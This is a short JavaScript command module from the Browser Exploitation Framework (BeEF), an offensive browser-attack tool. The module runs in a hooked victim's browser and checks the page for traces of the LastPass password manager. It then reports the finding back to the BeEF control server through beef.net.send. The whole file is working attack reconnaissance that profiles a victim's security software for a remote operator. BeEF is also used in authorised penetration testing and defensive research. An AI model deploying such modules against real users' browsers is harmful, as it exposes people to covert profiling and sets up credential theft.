//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
	var result = "Not in use or not installed";

	var lpdiv = document.getElementById('hiddenlpsubmitdiv');
	if (typeof(lpdiv) != 'undefined' && lpdiv != null) {
		//We've got the first detection of LP
		result = "Detected LastPass through presence of the <script> tag with id=hiddenlpsubmitdiv";
	} else if ($j("script:contains(lastpass_iter)").length > 0) {
		//We've got the second detection of LP
		result = "Detected LastPass through presense of the embedded <script> which includes references to lastpass_iter";
	} else {

		//Form is not there, lets check for any form elements in this page, because, LP won't activate at all without a <form>
		if (document.getElementsByTagName("form").length == 0) {
			//No forms
			result = "The page doesn't seem to include any forms - we can't tell if LastPass is installed";
		}
		
	}

	beef.net.send("<%= @command_url %>", <%= @command_id %>, "lastpass="+result);
});

